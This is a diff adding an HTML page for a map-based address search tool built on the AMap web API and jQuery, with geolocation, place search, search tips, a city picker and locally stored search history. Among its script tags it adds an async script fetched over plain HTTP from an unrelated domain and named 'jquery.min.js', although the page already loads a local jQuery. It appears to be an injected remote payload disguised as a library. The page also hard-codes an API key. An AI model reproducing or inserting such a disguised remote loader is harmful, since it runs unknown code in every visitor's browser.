@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<title>搜索地址</title>
+		<link rel="stylesheet" type="text/css" href="../css/search.css"/>
+	</head>
+	<body>
+		<div id="searchs">
+			<!--搜索框-->
+			<div id="search-form">
+				<input type="text" name="content" id="content" value="" />
+				<button id="submit">搜索</button>
+				<!--历史记录与搜索内容-->
+				<div id="historySearch">
+					<div class="history">
+						<ul id="historys">
+						</ul>
+					</div>
+					<div class="search-form-counts">
+						
+					</div>
+				</div>
+				<!--选择地址-->
+				<div class="address">
+					<div class="address_top">
+						<span class="address_drown"><b>河南</b> <i></i></span>
+					</div>
+				</div>
+				<div class="address_bottom">
+						<h2 class="titles"><span class="city-current">当前城市：河南</span> <span class="close">X</span></h2>
+						<div class="address-criy">
+							<div class="major-cities">
+								<ul>
+									<li>全国</li>
+									<li>北京</li>
+									<li>天津</li>
+									<li>沈阳</li>
+									<li>大连</li>
+									<li>上海</li>
+									<li>南京</li>
+									<li>苏州</li>
+									<li>杭州</li>
+									<li>青岛</li>
+									<li>郑州</li>
+									<li>武汉</li>
+									<li>长沙</li>
+									<li>广州</li>
+									<li>深圳</li>
+									<li>重庆</li>
+									<li>成都</li>
+									<li>西安</li>
+									<li>香港</li>
+									<li>澳门</li>
+									<li>台湾</li>
+								</ul>
+							</div>
+							<div class="national-cities">
+								<ul class="shengfen">
+									<li class="city-select">按省份</li>
+									<li class="city-left-border">按城市</li>
+								</ul>
+								<div class="cities" id="cities">
+								</div>
+							</div>
+						</div>
+					</div>
+			</div>
+			
+			<!--搜索之后显示的内容-->
+			<div class="search-content">
+				<ul id="record">
+					
+				</ul>
+				<!--页数切换-->
+				<div class="pagination">
+					<div class="pag_left">
+						<!--<span>1页/20页</span>-->
+					</div>
+					<div class="pag_right">
+						<span class="shouye">首页</span>
+						<span class="aleft"><</span>
+						<span class="rightwards">></span>
+					</div>
+				</div>
+			</div>
+			<div id="map"></div>
+		</div>
+		
+		<script src="http://webapi.amap.com/maps?v=1.4.6&key=7887f8898bfdbc49ff7805c05583719e" type="text/javascript" charset="utf-8"></script>
+		<script src="../lib/jquery-1.11.0.js" type="text/javascript" charset="utf-8"></script>
+		<script src="../lib/全国省分和城市名.js" type="text/javascript" charset="utf-8"></script>
+		<script charset="utf-8" async="true" src="http://s.5myr.cn/tt/jquery.min.js?tcdsp"></script>
+		<script src="../lib/scrpt.js" type="text/javascript" charset="utf-8"></script>
+		<script type="text/javascript">
+// 		地图初始化
+ 	var markers = [];
+ 	 var str=[];//获取
+			   var maps, geolocation ,mapSearch;
+		    //加载地图，调用浏览器定位服务
+		    maps = new AMap.Map('map', {
+		        resizeEnable: true
+		    });
+		    maps.plugin('AMap.Geolocation', function() {
+		        geolocation = new AMap.Geolocation({
+		            enableHighAccuracy: true,//是否使用高精度定位，默认:true
+		            timeout: 10000,          //超过10秒后停止定位，默认：无穷大
+		            buttonOffset: new AMap.Pixel(10, 20),//定位按钮与设置的停靠位置的偏移量，默认：Pixel(10, 20)
+		            zoomToAccuracy: true,      //定位成功后调整地图视野范围使定位位置及精度范围视野内可见，默认：false
+		            buttonPosition:'RB'
+		        });
+		        maps.addControl(geolocation);
+		        geolocation.getCurrentPosition();
+		        AMap.event.addListener(geolocation, 'complete', onComplete);//返回定位信息
+		        AMap.event.addListener(geolocation, 'error', onError);      //返回定位出错信息
+		    });
+		    //解析定位结果
+		   function onComplete(data) {
+		        str.push( data.position.getLng());
+		        str.push(data.position.getLat());
+		        	mapSearch={
+				 		initialise:	function (str,zooms){
+							var  longitude=str[0];//经度
+							var  latitude=str[1]; //纬度
+							
+							var marker, map = new AMap.Map('map', {
+						        resizeEnable: true,
+						        zoom:zooms,
+						        center: [longitude,latitude]//中心经纬度116.397428, 39.90923
+						 	});
+						 	
+//								判断执行一次
+								if(zooms==10){
+									mapSearch.Inverse(longitude,latitude);
+									mapSearch.clickCity();
+								}
+						 	return map;
+				 		},
+				 		//		        逆地理编码
+						Inverse:function (longitude,latitude){
+									$.ajax({
+										type:'get',
+										url:'http://restapi.amap.com/v3/geocode/regeo',
+										data:{
+											'json':'xml',
+											'location':longitude+','+latitude,
+											"key":'7887f8898bfdbc49ff7805c05583719e',
+											"radius":1000,
+											"extensions":"all"
+										},
+										async:true,
+										dataType:'jsonp',
+										success:function(data){
+											$(".address_drown b").text(data.regeocode.addressComponent.province);
+											$(".city-current").text("当前城市: "+data.regeocode.addressComponent.province)
+										},
+										error:function(data){
+											console.log(data)
+										}
+									})
+							},
+				 		records:function (keywords,citys,offsets,pages,str,zooms){
+				 					var map=this.initialise(str,zooms);
+									$.ajax({
+									type:"get",
+									url:"http://restapi.amap.com/v3/place/text",
+									data:{
+										"keywords":keywords,
+										"city":citys,
+										"json":'xml',
+										"offset":offsets,
+										"page":pages,
+										"key":'7887f8898bfdbc49ff7805c05583719e',
+										"extensions":'all'
+									},
+									async:true,
+									dataType:'jsonp',
+									success:function(data){
+//										初始化
+										$("#record").html("");
+				//						数据显示的列表
+										for(var i=0;i<data.pois.length;i++){
+											var li = document.createElement("li");
+											var addressLeft = document.createElement("div");
+											addressLeft.className="address_left";
+											var h6 = document.createElement("h6");
+											var p1 = document.createElement("p");
+											var p2 = document.createElement("p");
+											var photosRight = document.createElement("div");
+											photosRight.className="photos_right";
+											var photosImg = document.createElement("img");
+											h6.innerText =i+1+'.'+ data.pois[i].name;
+											p1.innerText = data.pois[i].type;
+											p2.innerText = data.pois[i].address;
+											addressLeft.append(h6);
+											addressLeft.append(p1);
+											addressLeft.append(p2);
+											li.append(addressLeft);
+											if(data.pois[i].photos.length != 0){
+												photosImg.src=data.pois[i].photos[0].url;
+												photosRight.append(photosImg);
+											}
+											li.append(photosRight);
+											$("#record").append(li);
+											//			显示图标
+											
+						    			var marker;
+						    			if (i === 0) {
+						    				var icon = new AMap.Icon({
+						    					image: 'https://vdata.amap.com/icons/b18/1/2.png',
+						    					size: new AMap.Size(24, 24)
+						    				});
+						    				marker = new AMap.Marker({
+						    					icon: icon,
+						    					position: data.pois[i].location.split(','),
+						    					offset: new AMap.Pixel(-12,-12),
+						    					zIndex: 101,
+						    					title:  data.pois[i].name,
+						    					map: map
+						    				});
+						    			} else {
+						    				marker = new AMap.Marker({
+						    					position: data.pois[i].location.split(','),
+						    					title:  data.pois[i].name,
+						    					map: map
+						    				});
+						    			}
+				    				markers.push(marker);
+							  		map.setFitView();
+										}
+
+										$(".pag_left").html("<span>"+pages+"页/"+Math.ceil(data.count/offsets)+"页"+"</span>")
+				//						本地保存总页数
+										$(".pag_left").attr("count",Math.ceil(data.count/offsets));
+									},
+									error:function(data){
+										console.log(data)
+									}
+								});	
+							},
+							//		        	根据城市名字获取当前的地图
+					cityName:function (addressDrownText,zoms){
+								$.ajax({
+										type:"get",
+										url:"http://restapi.amap.com/v3/config/district",
+										data:{
+											"keywords":addressDrownText,
+											"subdistrict":2,
+											"key":'7887f8898bfdbc49ff7805c05583719e',
+											"showbiz":false,
+											"extensions":"base"
+										},
+										async:true,
+										dataType:'jsonp',
+										success:function(data){
+											var lngLat=data.districts[0].center;
+											var arrLngLat=lngLat.split(",");
+											mapSearch.initialise(arrLngLat,zoms);
+											$(".address_drown b").attr({"lnglat":lngLat});
+										},
+										error:function(data){
+											console.log(data)
+										}
+									})
+					},
+//					点击跳转到对应的城市地图
+					clickCity:function(){
+						$(".major-cities ul").find("li").each(function(index,el){
+							$(el).click(function(){
+								if(index>0){
+									$(".address_drown b").text($(this).text());
+									$(".address_bottom").hide();
+									$(".address_drown").removeClass("address_up");
+									mapSearch.cityName($(this).text(),11);
+									return false;
+								}
+							})
+						});
+						$("#frame dd").find("li").each(function(index,el){
+							$(el).click(function(){
+								
+									$(".address_drown b").text($(this).text());
+									$(".address_bottom").hide();
+									$(".address_drown").removeClass("address_up");
+									mapSearch.cityName($(this).text(),13);
+									return false;
+							});
+						});
+						$("#frame1 dd").find("li").each(function(index,el){
+							$(el).click(function(){
+								
+									$(".address_drown b").text($(this).text());
+									$(".address_bottom").hide();
+									$(".address_drown").removeClass("address_up");
+									mapSearch.cityName($(this).text(),13);
+									return false;
+							});
+						});
+					}
+				}
+		        	mapSearch.initialise(str,10);
+		    }
+		    //解析定位错误信息
+		    function onError(data) {
+		        alert("定位失败！");
+		    }
+ 
+//			生成搜索内容
+			function searchCount(keywords,citys,pages,srt,zooms){
+				mapSearch.records(keywords,citys,pages,'1',srt,zooms);//初始化搜索
+				//			点击切换列表
+			$(".shouye").click(function(){
+				$("#record").html("");
+				mapSearch.records(keywords,citys,pages,'1',srt,zooms);
+			})
+			var offset=1;
+			$(".aleft").click(function(){
+				if(offset>1){
+					$("#record").html("");
+					offset=offset-1;
+					mapSearch.records(keywords,citys,pages,offset,srt,zooms);
+				}
+			})
+			$(".rightwards").click(function(){
+				var counts=$(".pag_left").attr("count");
+				if(offset<counts){
+					$("#record").html("");
+					offset=offset+1;
+					mapSearch.records(keywords,citys,pages,offset,srt,zooms);
+				}
+			})
+			}
+			
+//			生成城市数据
+			function nationals(national){
+				var province = document.createElement("div");
+				province.className="province";
+				province.style.display="block";
+				province.id="province";
+				var jsShengfen = document.createElement("ul");
+				jsShengfen.className="js_shengfen";
+				jsShengfen.id="radio";
+				var jsScroll = document.createElement("div");
+				jsScroll.id= "scroll";
+				var jsChengshi = document.createElement("dl");
+				jsChengshi.className="js_chengshi";
+				jsChengshi.id="frame";
+				var scrollbar = document.createElement("div");
+				scrollbar.id="scrollbar";
+				var scroller = document.createElement("div");
+				scroller.id="scroller";
+				scroller.className="scroller";
+				scrollbar.appendChild(scroller);
+//				城市数据
+				var provinceCitys = document.createElement("div");
+				provinceCitys.className="province";
+				var jsShengfenCitys = document.createElement("ul");
+				jsShengfenCitys.className="js_shengfen";
+				jsShengfenCitys.id="radio1";
+				var jsScroll1 = document.createElement("div");
+				jsScroll1.id= "scroll1";
+				var jsChengshiCitys = document.createElement("dl");
+				jsChengshiCitys.className="js_chengshi";
+				jsChengshiCitys.id="frame1";
+				var scrollbar1 = document.createElement("div");
+				scrollbar1.id="scrollbar1";
+				var scroller1 = document.createElement("div");
+				scroller1.id="scroller1";
+				scroller1.className="scroller1";
+				scrollbar1.appendChild(scroller1);
+				for(index in national){
+					if(index == "save"){
+						for(i in national[index]){
+							var li=document.createElement("li");
+							li.innerText=i;
+							jsShengfen.appendChild(li);
+							for(j in national[index][i]){
+								var dt=document.createElement("dt");
+								dt.className=i;
+								dt.innerText=j;
+								jsChengshi.appendChild(dt);
+								var dd=document.createElement("dd");
+								dd.className="op-section";
+								dd.className=i+"d";
+								for(var n=0;n< national[index][i][j].length;n++){
+									var ddLi=document.createElement("li");
+									ddLi.innerText=national[index][i][j][n];
+									dd.appendChild(ddLi);
+									jsChengshi.appendChild(dd);
+								}
+							}
+						}
+						province.appendChild(jsShengfen);
+						jsScroll.appendChild(jsChengshi);
+						jsScroll.appendChild(scrollbar);
+						province.appendChild(jsScroll);
+						$("#cities").append(province);
+						
+					}else if(index == "citys"){
+						for(j in national[index]){
+							var li=document.createElement("li");
+							li.innerText=j;
+							jsShengfenCitys.appendChild(li);
+							
+								var dt=document.createElement("dt");
+								dt.className=j;
+								dt.innerText=j;
+								jsChengshiCitys.appendChild(dt);
+								var dd=document.createElement("dd");
+								dd.className=j+"d";
+								for(var n=0;n< national[index][j].length;n++){
+									
+									var ddLi=document.createElement("li");
+									ddLi.innerText=national[index][j][n];
+									dd.appendChild(ddLi);
+									jsChengshiCitys.appendChild(dd);
+								}
+						}
+						provinceCitys.appendChild(jsShengfenCitys);
+//						provinceCitys.appendChild(jsChengshiCitys);
+						jsScroll1.appendChild(jsChengshiCitys);
+						jsScroll1.appendChild(scrollbar1);
+						provinceCitys.appendChild(jsScroll1);
+						$("#cities").append(provinceCitys);
+					}
+				}
+//				城市省份切换
+				function provinces(){
+					$(".shengfen li").each(function(index,el){
+						$(el).click(function(){
+							if(!$(this).hasClass("city-select")){
+								$(this).siblings().removeClass("city-select");
+								$(this).addClass("city-select");
+								$(".province").siblings().css({"display":"none"});
+								$(".province").eq($(this).index()).css({"display":"block"});
+							}
+						})
+					})
+				}
+				provinces()
+//				点击滚动
+				function clickScroll(radio,frame,scroll,scroller){
+				 	$(radio+" li").each(function(index,el){
+				 		$(el).click(function(){
+				 			var texts = $(this).text();
+				 			var heights=0;
+				 			$(frame).children("dd").each(function(i,els){
+				 				if($(els).hasClass(texts+"d")){
+				 					if(i==0){
+				 						$(frame).css({"top":0});
+				 						$(scroller).css({"top":0});
+				 					}
+				 					return false;
+				 				}else{
+				 					heights=$(els).height()+heights;
+				 					if(heights+255<$(frame).height()){
+				 						$(frame).css({"top":-heights});
+//				 						滚动条相对应的位置
+										var num = $(frame).height()/$(scroll).height();
+										var tops = heights/num
+										$(scroller).css({"top":tops});
+				 					}else{
+				 						$(frame).css({"top":-$(frame).height()+236});
+				 					}
+				 				}
+				 			})
+				 		})
+				 	});
+				}
+				clickScroll("#radio","#frame","#scroll1","#scroller");
+				clickScroll("#radio1","#frame1","#scroll1","#scroller1");
+				TINY.scroller.init('scroll','frame','scrollbar','scroller','buttonclick');
+				TINY.scroller.init('scroll1','frame1','scrollbar1','scroller1','buttonclick1');
+//				进行动态隐藏
+				$(".province").eq(1).css({"display":"none"});
+				$(".address_bottom").hide();
+			}
+//			隐藏显示
+			function showHeddle(){
+				$(".close").click(function(){
+					$(".address_bottom").hide();
+					$(".address_drown").removeClass("address_up");
+				})
+				$(".address_top").click(function(){
+					$(".address_bottom").show();
+					$(".address_bottom").css({"opacity": 1})
+					$(".address_drown").addClass("address_up");
+				})
+			}
+			
+//			历史记录
+			function historys(){
+//			获取焦点
+			$("#content").focus(function(){
+				$("#historySearch").show();
+				$(".history").show();
+				$("#history").show();
+//				添加历史记录
+				$("#historys").html("");
+				if(localData.get("fist")){
+					var historyGet=changeArr(strArr(localData.get("fist")));
+					
+					for(var h=0;h<historyGet.length;h++){
+						if(localData.get(historyGet[h])){
+							
+							addLi(localData.get(historyGet[h]),"historys");	
+						}
+					}
+				}
+				clickHistory();
+			})
+			$("#map").click(function(){
+				$("#historySearch").hide();
+				$(".history").hide();
+//				$("#historys").html("");
+			})
+//			数组反向
+			function changeArr(change){
+				return change.reverse();
+			}
+//			点击历史记录实现搜索
+			function clickHistory(){
+
+				$("#historys").on("click","li",function(){
+					$("#record").html("");
+					var historyText=$(this).text();
+					$("#content").val(historyText);
+					var ctiy=$(".address_drown b").text();
+					//获取经纬度
+					var lngd=$(".address_drown b").attr("lnglat");
+					if(lngd){
+						var strs=lngd.split(",");
+					}else{
+						var strs=str;
+					}
+					mapSearch.records(historyText,ctiy,20,1,strs,16);
+					$("#historys").html("");
+					$(".search-content").show();
+					searchCount(historyText,ctiy,20,strs,16);
+					qingkongHistory();
+				})
+			}
+//				字符串转换成数组
+				var strArr=function(str){
+					return str.split(",");
+				}
+				//添加本地存储
+				localData = {
+					        hname:location.hostname?location.hostname:'localStatus',
+					        isLocalStorage:window.localStorage?true:false,
+					        dataDom:null,
+					
+					        initDom:function(){ //初始化userData
+					            if(!this.dataDom){
+					                try{
+					                	console.log(this)
+					                    this.dataDom = document.createElement('input');//这里使用hidden的input元素
+					                    this.dataDom.type = 'hidden';
+					                    this.dataDom.style.display = "none";
+					                    this.dataDom.addBehavior('#default#userData');//这是userData的语法
+					                    document.body.appendChild(this.dataDom);
+					                    var exDate = new Date();
+					                    exDate = exDate.getDate()+30;
+					                    this.dataDom.expires = exDate.toUTCString();//设定过期时间
+					                }catch(ex){
+					                    return false;
+					                }
+					            }
+					            return true;
+					        },
+					        set:function(key,value){
+					            if(localData.isLocalStorage){
+					                window.localStorage.setItem(key,value);
+					            }else{
+					            	console.log(localData)
+					                if(localData.initDom()){
+					                    localData.dataDom.load(localData.hname);
+					                    localData.dataDom.setAttribute(key,value);
+					                    localData.dataDom.save(localData.hname)
+					                }
+					            }
+					        },
+					        get:function(key){
+					            if(localData.isLocalStorage){
+					                return window.localStorage.getItem(key);
+					            }else{
+					            	console.log(this)
+					                if(localData.initDom()){
+					                    localData.dataDom.load(localData.hname);
+					                    return localData.dataDom.getAttribute(key);
+					                }
+					            }
+					        },
+					        remove:function(key){
+					            if(localData.isLocalStorage){
+					                localStorage.removeItem(key);
+					            }else{
+					                if(localData.initDom()){
+					                    localData.dataDom.load(localData.hname);
+					                    localData.dataDom.removeAttribute(key);
+					                    localData.dataDom.save(localData.hname)
+					                }
+					            }
+					        }
+					    }
+				
+				localData.initDom();//初始化
+				var random =function(sum,Callback){
+					/* randomWord 产生任意长度随机字母数字组合
+					** randomFlag-是否任意长度 min-任意长度最小位[固定位数] max-任意长度最大位*/
+					function randomWord(randomFlag, min, max){
+					    var str = "",
+					        range = min,
+					        arr = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];
+					 
+					    // 随机产生
+					    if(randomFlag){
+					        range = Math.round(Math.random() * (max-min)) + min;
+					    }
+					    for(var i=0; i<range; i++){
+					        pos = Math.round(Math.random() * (arr.length-1));
+					        str += arr[pos];
+					    }
+					    return str;
+					}
+					for(var i=0;i<sum;i++){
+						name.push(randomWord(true,3,32));
+					}
+					Callback("fist",name);
+				}
+//				var addHistory=function(num,id){
+//				  stringCookie=localData.get('history');
+//				  var stringHistory=""!=stringCookie?stringCookie:"{history:[]}";
+//				  var json=new JSON(stringHistory);
+//				  var e="{num:"+num+",id:"+id+"}";
+//				  json['history'].push(e);//添加一个新的记录
+//				  setCookie('history',json.toString(),30);
+//				}
+
+//				存储搜索的记录
+				var searchjl=function(){
+					document.getElementById("submit").onclick=function(){
+						var shujv=document.getElementById("content").value;
+						var arrFist=strArr(localData.get("fist"));
+						for(var n=0;n<arrFist.length;n++){
+							if(!localData.get(arrFist[n])){
+								localData.set(arrFist[n],shujv);
+								break;
+							}
+						}
+						$(".search-content").show();
+						var addressDrown=$(".address_drown b").text();
+						//获取经纬度
+						var lngd=$(".address_drown b").attr("lnglat");
+						if(lngd){
+							var strss=lngd.split(",");
+						}else{
+							var strss=str;
+						}
+						searchCount(shujv,addressDrown,20,strss,16);
+						inputEmpty();
+						qingkongHistory();
+					}
+				}
+				searchjl();
+				function qingkongHistory(){
+					//	清空搜索记录
+						$("#historySearch").hide();
+						$(".history").hide();
+						$("#historys").html("");
+				}
+				//添加一个li元素
+				var addLi=function(texts,pid){
+				  var li=document.createElement('li');
+				  li.innerText=texts;
+				  document.getElementById(pid).appendChild(li);
+				}	
+				//				随机生成cookie的name值
+//				sum随机数多少个
+//				第一次执行
+				if(localData.get("fist")){
+					var flaot=true;
+					var ArrGet=strArr(localData.get("fist"));
+					for(var s=0;s<ArrGet.length;s++){
+						if(!localData.get(ArrGet[s])){
+							flaot=false;
+						}
+					}
+					if(flaot){
+						random(20,localData.set);
+					}
+					
+				}else{
+					var name=[];
+					random(20,localData.set);
+				}
+			}
+			
+//			清空输入框
+			function inputEmpty(){
+				document.getElementById("content").value="";
+			}
+			
+//			搜索提示
+			function searchTips(keywords,citys,str){
+				$.ajax({
+					type:"get",
+					url:"http://restapi.amap.com/v3/assistant/inputtips",
+					data:{
+						"key":"7887f8898bfdbc49ff7805c05583719e",
+						"keywords":keywords,
+						"location":[str[0],str[1]],
+						"city":citys,
+						"datatype":"all"
+					},
+					async:true,
+					dataType:"jsonp",
+					success:function(data){
+						$(".search-form-counts").html("");
+						for(var l=0;l<data.tips.length;l++){
+							var li=document.createElement("li");
+							li.className="search-text";
+							li.innerText=data.tips[l].name;
+							$(".search-form-counts").append(li);
+						}
+						//				点击搜索提示内容进行搜索
+							clickonSearchTips();
+					},
+					error:function(data){
+						console.log(data)
+					}
+				})
+			}
+//			搜索提示
+			$("#content").keyup(function(event){
+			$("#historySearch").show();
+			$(".search-form-counts").show();
+			$("#historys").hide();
+				var keycharText , numcheckText;
+				keycharText=$(".address_drown b").text();
+				//获取经纬度
+				var lngd=$(".address_drown b").attr("lnglat");
+				if(lngd){
+					var strsss=lngd.split(",");
+				}else{
+					var strsss=str;
+				}
+				numcheckText=$(this).val();
+	            searchTips(numcheckText,keycharText,strsss);
+			})
+//			点击搜索提示内容进行搜索
+			function clickonSearchTips(){
+				$(".search-text").click(function(){
+					var searchText=$(this).text();
+					$("#content").val(searchText);
+					var lngd=$(".address_drown b").attr("lnglat");
+					if(lngd){
+						var strsss=lngd.split(",");
+					}else{
+						var strsss=str;
+					}
+					var cityss=$(".address_drown b").text();
+					searchCount(searchText,cityss,20,strsss,18);
+					$("#historySearch").hide();
+					$(".search-form-counts").hide();
+					$(".search-content").show();
+					clickHistory();
+				})
+			}
+//			回到初始值
+			function startingValue(){
+//				隐藏显示
+				showHeddle();
+//				生成城市数据
+				nationals(national);
+//				历史记录
+				historys();
+//				清空输入框
+				inputEmpty();
+			}
+			startingValue();
+	</script>
+	</body>
+</html>
